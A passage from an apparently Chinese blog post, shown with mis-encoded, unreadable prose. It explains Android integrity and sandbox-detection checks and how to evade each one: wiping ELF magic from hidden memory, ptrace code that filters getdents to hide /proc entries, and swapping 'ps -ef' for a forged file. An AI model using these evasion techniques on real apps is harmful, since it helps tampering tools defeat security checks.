class="line">                //MPROTECT((size_t)begin, size, MEMORY_R);</span><br><span class="line">                unsigned long output = checksum(begin, size);</span><br><span class="line">                LOGI(&quot;%s checksum:[%ld][%ld]&quot;, libraryName, output, pElfSectArr-&gt;checksum[i])</span><br><span class="line">                if (output != pElfSectArr-&gt;checksum[i]) &#123;</span><br><span class="line">                    //å’Œæœ¬åœ°çš„So Checksum å¯¹ä¸ä¸Š</span><br><span class="line">                    return 1;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if (buf[0] == &#x27;r&#x27;) &#123;</span><br><span class="line">            pElfSectArr-&gt;startAddrinMem = start;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶è¿™å—å°±ä¸€å®šæ˜¯æ¯”è¾ƒå®Œå–„çš„æ£€æµ‹æ–¹æ¡ˆäº†ä¹ˆï¼Ÿå…¶å®æœ‰å¾ˆå¤šå¯¹æŠ—æ€è·¯ ã€‚æ¯”å¦‚æŠŠmapsé‡Œé¢çš„å†…å­˜è¿›è¡Œéšè—ï¼Œå˜æˆåŒ¿åå†…å­˜ï¼Œè¿™æ ·ä»–åœ¨æ‰«æmapsçš„å°±æ‰¾ä¸åˆ°ï¼Œå¯¹åº”çš„æ¯”å¦‚ä¸Šé¢è¯´çš„libcçš„item</p><p>è¿™å—å¯ä»¥å‚è€ƒrirué‡Œé¢çš„ map_hide ï¼Œä»£ç è·¯å¾„å¦‚ä¸‹ </p><p><a href="https://github.com/RikkaApps/Riru/blob/master/riru/src/main/cpp/hide_utils.cpp">https://github.com/RikkaApps/Riru/blob/master/riru/src/main/cpp/hide_utils.cpp</a></p><p>å½“ç„¶è¿™ç§æ–¹å¼ä¸€å®šæ˜¯å®‰å…¨çš„ä¹ˆï¼Ÿ</p><blockquote><p>å…¶å®ï¼Œä¸æ˜¯çš„ï¼Œå› ä¸ºåœ¨ä»–çš„è¿™ä¸ªä»£ç é‡Œé¢æˆ‘å‘ç°å­˜åœ¨ä¸€ä¸ªé—æ¼ç‚¹ï¼Œå¯ä»¥ä½œä¸ºæ£€æµ‹å…¥æ‰‹ç‚¹ ï¼ŒæŸä¸ªåŠ å›ºå‚å•†ï¼Œä¸ä»…ä»…ä¼šå¯¹<code>maps item</code>è¿›è¡Œéå† ï¼Œè¿˜ä¼šå¯¹é‡Œé¢çš„åŒ¿åå†…å­˜è¿›è¡Œéå† ï¼Œæ£€æµ‹åŒ¿åå†…å­˜é‡Œé¢çš„ <code>magic</code> ï¼Œæ¯”å¦‚<code>so</code> æ–‡ä»¶çš„<code>magic</code>æ˜¯<code>elf</code> ï¼Œå¦‚æœ<code>magic</code> åŒ¹é…ä¸Šä¸€æ ·å½“<code>maps</code>å»è§£æ å»éå†ã€‚</p><p>æ‰€ä»¥å¯ä»¥åœ¨åŸæœ‰çš„åŸºç¡€ä¸Šæ”¹æ”¹ï¼Œåœ¨å°†å†…å­˜å˜æˆåŒ¿åå†…å­˜ä»¥åï¼Œ<strong>æŠŠelfçš„å‰å››ä¸ªå­—èŠ‚æŠ¹æ‰</strong>ï¼Œä¹Ÿå°±æ˜¯magicçš„ å†…å®¹ï¼ŒæŠ¹æ‰ä»¥åè®°å¾—æŠŠæƒé™ä¿®æ”¹æˆå’Œä¹‹å‰çš„ä¸€æ · ã€‚é˜²æ­¢å†…å­˜æ£€æµ‹ ã€‚</p></blockquote><h3 id="æ£€æµ‹æ²™ç®±"><a href="#æ£€æµ‹æ²™ç®±" class="headerlink" title="æ£€æµ‹æ²™ç®±"></a>æ£€æµ‹æ²™ç®±</h3><p>è¿™å—æ£€æµ‹æ ¸å¿ƒé€»è¾‘å…¨éƒ¨æ”¾åœ¨<code>ISO</code>çº¿ç¨‹æ£€æµ‹ ã€‚å¯ä»¥é…ç½®ä¸€ä¸ªæœåŠ¡ï¼Œç„¶åæœåŠ¡é‡Œä½¿ç”¨å¦‚ä¸‹å˜é‡å³å¯ ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;service</span><br><span class="line">    android:name=&quot;.ZhenxiServer&quot;</span><br><span class="line">    android:isolatedProcess=&quot;true&quot;</span><br><span class="line">    android:useAppZygote=&quot;true&quot;</span><br><span class="line">    /&gt;</span><br></pre></td></tr></table></figure><p>è¿™å—æœ‰äººå¯èƒ½ä¼šé—®ä»€ä¹ˆæ˜¯isoçº¿ç¨‹ï¼Ÿ<strong>å¯ä»¥ç†è§£æˆä¸€ä¸ªç‹¬ç«‹çš„å®‰å…¨çš„çº¿ç¨‹</strong>ï¼Œåªèƒ½é€šè¿‡å’Œå¤–éƒ¨IPCäº¤äº’çš„æ–¹å¼è¿›è¡Œé€šè®¯ ã€‚useAppZygote ç›¸å½“äºè®©è¿™ä¸ªè¿›ç¨‹è¿è¡Œåœ¨Zygoteä¸­ ã€‚<strong>è¿™ä¸ªæ—¶å€™æ—¶æœºç‰¹åˆ«æ—©</strong>ï¼Œæ—©åˆ°ä»€ä¹ˆç¨‹åº¦å‘¢ï¼Ÿå°±<strong>è¿libart.so éƒ½æ²¡åŠ è½½</strong>ï¼Œæ‰€ä»¥è¿™ä¸ªæ£€æµ‹è¿›ç¨‹åªèƒ½è°ƒç”¨ä¸€äº›åŸå§‹çš„libcæ–¹æ³•ï¼Œä¸èƒ½è°ƒç”¨ä»»ä½•Artç›¸å…³çš„å‡½æ•° ã€‚</p><p>ä¸‹é¢ä¹Ÿæ˜¯ä¸»è¦ä»‹ç»ä¸€ä¸‹<code>hunter</code>çš„æ£€æµ‹æ€è·¯ ã€‚</p><h4 id="æ£€æµ‹å¤šä½™çº¿ç¨‹PID"><a href="#æ£€æµ‹å¤šä½™çº¿ç¨‹PID" class="headerlink" title="æ£€æµ‹å¤šä½™çº¿ç¨‹PID:"></a>æ£€æµ‹å¤šä½™çº¿ç¨‹PID:</h4><p>ä¸»è¦å®ç°æ€è·¯å°±æ˜¯å»æ£€æµ‹procä¸‹é¢æ˜¯å¦æœ‰é™¤äº†mainè¿›ç¨‹ä»¥å¤–çš„å…¶ä»–pid ,å› ä¸ºæ­£å¸¸å¯åŠ¨çš„è¯ï¼Œè‚¯å®šæ˜¯åªæœ‰ä¸€ä¸ªmainè¿›ç¨‹ ã€‚</p><p>ä½†æ˜¯æ²™ç®±çš„è¯ä¼šåœ¨å¯åŠ¨ä¹‹å‰å»å¯åŠ¨åˆ«çš„è¿›ç¨‹ ï¼Œæ‰€ä»¥è¿™å—å¯ä»¥è¿›è¡Œbypass ã€‚åé¢æˆ‘ä¼šç»Ÿä¸€è¯´è¿™å—åº”è¯¥å¦‚ä½•å¯¹æŠ— ï¼ŒåŒ…æ‹¬å¦‚ä½•ç»•è¿‡</p><p>è¿™å—å…ˆä»‹ç»æ£€æµ‹æ€è·¯ ï¼Œå’Œæ£€æµ‹åŸç† ã€‚è¿™å—é‡Œé¢æœ‰ä¸€ä¸ª<code>replaceSecInsns</code>æ˜¯å°è£…çš„ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘æ‹…å¿ƒ <code>opendir</code> è¢«<code>Hook</code>äº†ï¼Œæ‰€ä»¥æ¯æ¬¡æ‰§è¡Œéƒ½å»æŠŠæŒ‡ä»¤æ›¿æ¢æˆ</p><p>æœ¬åœ°æ–‡ä»¶çš„æŒ‡ä»¤ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œå†…å­˜é‡Œé¢çš„æŒ‡ä»¤ ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">auto orig_opendir = reinterpret_cast&lt;DIR *(*)</span><br><span class="line">            (const char *)&gt;(replaceSecInsns(getlibcPath(), &quot;opendir&quot;));</span><br><span class="line">    DIR *pdr = orig_opendir(&quot;/proc&quot;);</span><br><span class="line">    if (pdr == nullptr) &#123;</span><br><span class="line">        return getItemData(env, &quot;ç¨‹åºå‡ºé”™è¯·æ”¾å¼ƒä¿®æ”¹åé‡è¯•&quot;,</span><br><span class="line">                           nullptr, true, RISK_LEAVE_DEADLY, TAG_SANDBOX);</span><br><span class="line">    &#125;</span><br><span class="line">    auto orig_ator = reinterpret_cast&lt;struct dirent *(*)(DIR *)&gt;</span><br><span class="line">    (replaceSecInsns(getlibcPath(), &quot;readdir&quot;));</span><br><span class="line">    dirent *read_ptr;</span><br><span class="line">    //åœ¨appå¯åŠ¨ä¹‹å‰æ£€æµ‹å½“å‰appæ‰€æœ‰çš„è¿›ç¨‹,åˆ¤æ–­æ˜¯å¦å­˜åœ¨å’Œmainä¸ä¸€æ ·çš„è¿›ç¨‹</span><br><span class="line">    while ((read_ptr = orig_ator(pdr)) != nullptr) &#123;</span><br><span class="line">        long procPid = strtol(read_ptr-&gt;d_name, nullptr, 10);</span><br><span class="line">        //LOG(INFO) &lt;&lt; &quot;find /proc/ child dir  &quot; &lt;&lt; procPid;</span><br><span class="line">        //æ‰“å¼€æˆåŠŸ&amp;&amp;å‘ç°ä¸€æ¡ä¸ç­‰äºä¸»è¿›ç¨‹idçš„pid</span><br><span class="line">        if (procPid &amp;&amp; procPid != getpid()) &#123;</span><br><span class="line">            auto title = string(&quot;æ£€æµ‹åˆ°APKå­˜åœ¨æ²™ç®±å†…éƒ¨&quot;);</span><br><span class="line">            char buff[200];</span><br><span class="line">            getNameByPid((pid_t) procPid, buff);</span><br><span class="line">            LOG(ERROR) &lt;&lt; &quot;&gt;&gt;&gt;&gt;&gt;  FIND OTHER THREAD SANDBOX &quot; &lt;&lt; procPid &lt;&lt; &quot;  &quot; &lt;&lt; buff;</span><br><span class="line">            auto &amp;data =</span><br><span class="line">                    string(&quot;å½“å‰çº¿ç¨‹ä¸»è¿›ç¨‹PID(&quot;).append(to_string(getpid())).append(&quot;)&quot;).append(&quot;\n&quot;).</span><br><span class="line">                            append(&quot;å¼‚å¸¸pid -&gt; &quot;).append(to_string(procPid)).</span><br><span class="line">                            append(&quot;(&quot;).append(&quot;pid name: &quot;).append(buff).append(&quot;)&quot;);</span><br><span class="line">            //å¯èƒ½å­˜åœ¨å¤šä¸ªå¼‚å¸¸pidè€Œéä¸€ä¸ª</span><br><span class="line">            getItemData(env, title, data.c_str(), false, RISK_LEAVE_WARN, TAG_SANDBOX);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(pdr);</span><br></pre></td></tr></table></figure><h5 id="å¯¹æŠ—ï¼š"><a href="#å¯¹æŠ—ï¼š" class="headerlink" title="å¯¹æŠ—ï¼š"></a>å¯¹æŠ—ï¼š</h5><p>è¿™å—æƒ³è¦ç»•è¿‡ä¹Ÿå¾ˆç®€å•ï¼Œ<code>opendir</code> åº•å±‚å…¶å®å°±æ˜¯ <code>getdents64ï¼Œgetdents</code> å¦‚æœé‡åˆ°ä½ æƒ³éšè—çš„æ–‡ä»¶ç›´æ¥å¯¹æ–‡ä»¶è¿›è¡Œ<code>bypass</code>å°±å¯ä»¥äº†ï¼Œç›´æ¥æŒ‡å‘ä¸‹ä¸€ä¸ªæŒ‡é’ˆ</p><p>ä»£ç æ¥è‡ª<code>proot</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">        case SC_getdents64:</span><br><span class="line">        case SC_getdents: &#123;</span><br><span class="line">            /* get the result of the syscall, which is the number of bytes read by getdents</span><br><span class="line">             * è·å–ç³»ç»Ÿè°ƒç”¨çš„ç»“æœï¼Œå³getdentsè¯»å–çš„å­—èŠ‚æ•°</span><br><span class="line">             * */</span><br><span class="line">            unsigned int res = peek_reg(tracee, CURRENT, SYSARG_RESULT);</span><br><span class="line">            if (res &lt;= 0) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            /* get the system call arguments */</span><br><span class="line">            word_t orig_start = peek_reg(tracee, CURRENT, SYSARG_2);</span><br><span class="line">            unsigned int count = peek_reg(tracee, CURRENT, SYSARG_3);</span><br><span class="line">            char orig[count];</span><br><span class="line"> </span><br><span class="line">            char path[PATH_MAX];</span><br><span class="line">            int status = readlink_proc_pid_fd(tracee-&gt;pid,</span><br><span class="line">                                              (int) peek_reg(tracee, ORIGINAL, SYSARG_1), path);</span><br><span class="line">            if (status &lt; 0) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            //ä¸å±äºç»‘å®šè·¯å¾„åˆ™ä¸å¤„ç†,è¿™å—åº”è¯¥åŠ ä¸ªåˆ¤æ–­ã€‚å¦‚æœè¿™ä¸ªpathæ²¡æœ‰å¤„ç†çš„è·¯å¾„åº”è¯¥è¿”å› ã€‚</span><br><span class="line">            //ç›®å‰éœ€è¦å¤„ç†çš„åªæœ‰proc,ç”¨äºéšè—è°ƒè¯•çº¿ç¨‹ã€‚</span><br><span class="line">//            if(!belongs_to_guestfs(tracee, path))</span><br><span class="line">//                return 0;</span><br><span class="line">            if (!StringUtils::containsInsensitive(path,&quot;proc&quot;))&#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            /* retrieve the data from getdents</span><br><span class="line">             * ä»getdentsæ£€ç´¢æ•°æ®</span><br><span class="line">             * */</span><br><span class="line">            status = read_data(tracee, orig, orig_start, res);</span><br><span class="line">            if (status &lt; 0) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            /* allocate a space for the copy of the data we want</span><br><span class="line">             * ä¸ºæˆ‘ä»¬æƒ³è¦çš„æ•°æ®çš„å‰¯æœ¬åˆ†é…ä¸€ä¸ªç©ºé—´</span><br><span class="line">             * */</span><br><span class="line">            char copy[count];</span><br><span class="line">            /* curr will hold the current struct we&#x27;re examining</span><br><span class="line">             * currå°†ä¿å­˜æˆ‘ä»¬æ­£åœ¨æ£€æŸ¥çš„å½“å‰ç»“æ„</span><br><span class="line">             * */</span><br><span class="line">            struct linux_dirent64 *curr64;</span><br><span class="line">            struct linux_dirent *curr32;</span><br><span class="line">            /* pos keeps track of where in memory the copy is</span><br><span class="line">             * posè·Ÿè¸ªå‰¯æœ¬åœ¨å†…å­˜ä¸­çš„ä½ç½®</span><br><span class="line">             * */</span><br><span class="line">            char *pos = copy;</span><br><span class="line">            /* ptr keeps track of where in memory the original is</span><br><span class="line">             * ptrè·Ÿè¸ªåŸå§‹æ–‡ä»¶åœ¨å†…å­˜ä¸­çš„ä½ç½®</span><br><span class="line">             * */</span><br><span class="line">            char *ptr = orig;</span><br><span class="line">            /* nleft keeps track of how many bytes we&#x27;ve saved</span><br><span class="line">             * nleftè·Ÿè¸ªæˆ‘ä»¬ä¿å­˜äº†å¤šå°‘å­—èŠ‚</span><br><span class="line">             * */</span><br><span class="line">            unsigned int nleft = 0;</span><br><span class="line"> </span><br><span class="line">            /* while we&#x27;re still within the memory allowed</span><br><span class="line">             * å½“æˆ‘ä»¬è¿˜åœ¨å…è®¸çš„memoryèŒƒå›´å†…æ—¶</span><br><span class="line">             * */</span><br><span class="line">            if (get_sysnum(tracee, ORIGINAL) == SC_getdents64) &#123;</span><br><span class="line">                while (ptr &lt; orig + res) &#123;</span><br><span class="line"> </span><br><span class="line">                    /* get the current struct</span><br><span class="line">                     * è·å–å½“å‰ç»“æ„</span><br><span class="line">                     * */</span><br><span class="line">                    curr64 = (struct linux_dirent64 *) ptr;</span><br><span class="line"> </span><br><span class="line">                    /* if the name does not matche a given prefix</span><br><span class="line">                     * å¦‚æœåç§°ä¸ç»™å®šå‰ç¼€ä¸åŒ¹é…</span><br><span class="line">                     *</span><br><span class="line">                     * å¦‚æœè¿™ä¸ªç›®å½•é¡¹çš„åç§°ä¸ä»¥HIDDEN_PREFIXå¼€å§‹ï¼Œ</span><br><span class="line">                     * ä¹Ÿå°±æ˜¯hasprefix(HIDDEN_PREFIX, curr64-&gt;d_name)è¿”å›falseï¼Œ</span><br><span class="line">                     * é‚£ä¹ˆè¿™ä¸ªç›®å½•é¡¹ä¼šè¢«ä¿ç•™åœ¨ç»“æœä¸­ï¼Œå¦åˆ™ï¼Œè¿™ä¸ªç›®å½•é¡¹ä¼šè¢«å¿½ç•¥ï¼Œä¹Ÿå°±æ˜¯éšè—ã€‚</span><br><span class="line">                     * */</span><br><span class="line">                    //if (!hasprefix(HIDDEN_PREFIX, curr64-&gt;d_name)) &#123;</span><br><span class="line">                    if (!isRuntimeHideDir(tracee-&gt;pid,curr64-&gt;d_name, tracer_pc(tracee), tracer_lr(tracee))) &#123;</span><br><span class="line">                        /* copy the information</span><br><span class="line">                         * å¤åˆ¶ä¿¡æ¯</span><br><span class="line">                         * */</span><br><span class="line">                        mybcopy(ptr, pos, curr64-&gt;d_reclen);</span><br><span class="line"> </span><br><span class="line">                        /* move the pos and nleft */</span><br><span class="line">                        pos += curr64-&gt;d_reclen;</span><br><span class="line">                        nleft += curr64-&gt;d_reclen;</span><br><span class="line">                    &#125;</span><br><span class="line">                    /* move to the next linux_dirent</span><br><span class="line">                     * éšè—è¿™ä¸ªç›®å½•,æŒ‡å‘ä¸‹ä¸€ä¸ªæ–‡ä»¶</span><br><span class="line">                     * */</span><br><span class="line">                    ptr += curr64-&gt;d_reclen;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                while (ptr &lt; orig + res) &#123;</span><br><span class="line"> </span><br><span class="line">                    /* get the current struct */</span><br><span class="line">                    curr32 = (struct linux_dirent *) ptr;</span><br><span class="line"> </span><br><span class="line">                    /* if the name does not matche a given prefix */</span><br><span class="line">//                    if (!hasprefix(HIDDEN_PREFIX, curr64-&gt;d_name)) &#123;</span><br><span class="line">                    if (!isRuntimeHideDir(tracee-&gt;pid,curr32-&gt;d_name, tracer_pc(tracee), tracer_lr(tracee))) &#123;</span><br><span class="line"> </span><br><span class="line">                        /* copy the information */</span><br><span class="line">                        mybcopy(ptr, pos, curr32-&gt;d_reclen);</span><br><span class="line"> </span><br><span class="line">                        /* move the pos and nleft */</span><br><span class="line">                        pos += curr32-&gt;d_reclen;</span><br><span class="line">                        nleft += curr32-&gt;d_reclen;</span><br><span class="line">                    &#125;</span><br><span class="line">                    /* move to the next linux_dirent */</span><br><span class="line">                    ptr += curr32-&gt;d_reclen;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            /* If there is nothing left</span><br><span class="line">             * è¿™ä¸ªæ–‡ä»¶å¤¹é‡Œé¢æœ¬èº«æ²¡æœ‰ä¸œè¥¿,æš‚ä¸å¤„ç†</span><br><span class="line">             * */</span><br><span class="line">            if (!nleft) &#123;</span><br><span class="line">//                /* call getdents again */</span><br><span class="line">//                if (get_sysnum(tracee, ORIGINAL) == PR_getdents64)</span><br><span class="line">//                    register_chained_syscall(tracee, PR_getdents64, peek_reg(tracee, ORIGINAL, SYSARG_1), orig_start, count, 0, 0, 0);</span><br><span class="line">//                else</span><br><span class="line">//                    register_chained_syscall(tracee, PR_getdents, peek_reg(tracee, ORIGINAL, SYSARG_1), orig_start, count, 0, 0, 0);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                /* copy the data back into the register */</span><br><span class="line">                status = write_data(tracee, orig_start, copy, nleft);</span><br><span class="line">                if (status &lt; 0) &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                /* update the return value to match the data */</span><br><span class="line">                poke_reg(tracee, SYSARG_RESULT, nleft);</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h4 id="æ‰§è¡Œpså‘½ä»¤ï¼š"><a href="#æ‰§è¡Œpså‘½ä»¤ï¼š" class="headerlink" title="æ‰§è¡Œpså‘½ä»¤ï¼š"></a>æ‰§è¡Œpså‘½ä»¤ï¼š</h4><p>è¿™å—çš„æ€è·¯å°±æ˜¯<strong>æ£€æµ‹æ˜¯å¦å­˜åœ¨å…¶ä»–è¿›ç¨‹</strong> ï¼Œé€šè¿‡æ‰§è¡Œ<code>ps -ef</code>å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">if (get_sdk_level() &gt; ANDROID_Q) &#123;</span><br><span class="line">    //check process</span><br><span class="line">    auto orig_popen = reinterpret_cast&lt;FILE *(*)(const char *,</span><br><span class="line">                                                 const char *)&gt;(replaceSecInsns(getlibcPath(),</span><br><span class="line">                                                                                &quot;popen&quot;));</span><br><span class="line">    FILE *file = orig_popen(&quot;ps -ef&quot;, &quot;r&quot;);</span><br><span class="line">    if (file == nullptr) &#123;</span><br><span class="line">        return getItemData(env, &quot;ç¨‹åºå‡ºé”™è¯·æ”¾å¼ƒä¿®æ”¹åé‡è¯•&quot;,</span><br><span class="line">                           &quot;ps error&quot;, true, 3, TAG_SANDBOX);</span><br><span class="line">    &#125;</span><br><span class="line">    char buf[0x1000];</span><br><span class="line">    string buffStr;</span><br><span class="line">    uint size = 0;</span><br><span class="line">    // get process count size</span><br><span class="line">    while (fgets(buf, sizeof(buf), file)) &#123;</span><br><span class="line">        buffStr.append(buf).append(&quot;\n&quot;);</span><br><span class="line">        //ä¸åŒ…å«++</span><br><span class="line">        if(!StringUtils::contains(buf,&quot;hunter&quot;))&#123;</span><br><span class="line">            size++;</span><br><span class="line">            LOG(INFO) &lt;&lt; &quot;ps -ef match -&gt; %s &quot; &lt;&lt; buf;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (size &gt; 2) &#123;</span><br><span class="line">        //UID             PID   PPID C STIME TTY          TIME CMD</span><br><span class="line">        //u0_a531        6187    885 72 10:27:53 ?    00:00:00 com.zhenxi.hunter</span><br><span class="line">        //u0_a531        6236   6187 0 10:27:53 ?     00:00:00 ps -ef</span><br><span class="line">        pclose(file);</span><br><span class="line"> </span><br><span class="line">        return getItemData(env, &quot;æ£€æµ‹åˆ°APKå­˜åœ¨æ²™ç®±å†…éƒ¨(å¼‚å¸¸çº¿ç¨‹)&quot;,</span><br><span class="line">                           buffStr.c_str(), false, RISK_LEAVE_DEADLY, TAG_SANDBOX);</span><br><span class="line">    &#125;</span><br><span class="line">    LOG(ERROR) &lt;&lt; &quot;&gt;&gt;&gt;&gt;&gt; NOT FIND SANDBOX &quot;;</span><br><span class="line">    pclose(file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="å¯¹æŠ—ï¼š-1"><a href="#å¯¹æŠ—ï¼š-1" class="headerlink" title="å¯¹æŠ—ï¼š"></a>å¯¹æŠ—ï¼š</h5><p>å¯ä»¥å…ˆä¼ªé€ ä¸€ä¸ªæ­£å¸¸çš„æ–‡ä»¶ï¼Œåœ¨æ‰§è¡Œåˆ° ps -efçš„æ—¶å€™æŠŠå‘½ä»¤æ¢æˆcat ä½ è‡ªå·±çš„æ–‡ä»¶ å³å¯ ã€‚</p><h4 id="å†…å­˜Choose"><a href="#å†…å­˜Choose" class="headerlink" title="å†…å­˜Choose:"></a>å†…å­˜Choose:</h4><p>è¿™å—çš„å®ç°æ€è·¯å°±æ˜¯ï¼Œæ£€æµ‹å†…å­˜é‡Œé¢çš„ Activity æˆ–è€… Applicationçš„ä¸ªæ•° ã€‚æ­£å¸¸æˆ‘ä»¬çš„apkå¯åŠ¨åªä¼šæœ‰æˆ‘ä»¬è‡ªå·±çš„</p><p>Applicationï¼Œæ²™ç®±å› ä¸ºé¢„å¯åŠ¨çš„å…³ç³»ï¼Œä¼šå­˜åœ¨å…¶ä»–çš„Application ï¼Œè¿™å—ä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„æ£€æµ‹æ€è·¯ ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public static ListItemBean checkSandbox() &#123;</span><br><span class="line">    ArrayList&lt;Object&gt; choose;</span><br><span class="line">    try &#123;</span><br><span class="line">        choose = ChooseUtils.choose(Activity.class, true);</span><br><span class="line">    &#125; catch (Throwable e) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">    if (choose != null) &#123;</span><br><span class="line">        ArrayList&lt;Object&gt; list = new ArrayList&lt;&gt;();</span><br><span class="line">        //ç§»é™¤æˆ‘ä»¬çš„Activity,æŠŠå…¶ä»–çš„activityå®ä¾‹åŠ åˆ°Listé‡Œé¢</span><br><span class="line">        for(Object activty:choose)&#123;</span><br><span class="line">            String name = activty.getClass().getName();</span><br><span class="line">            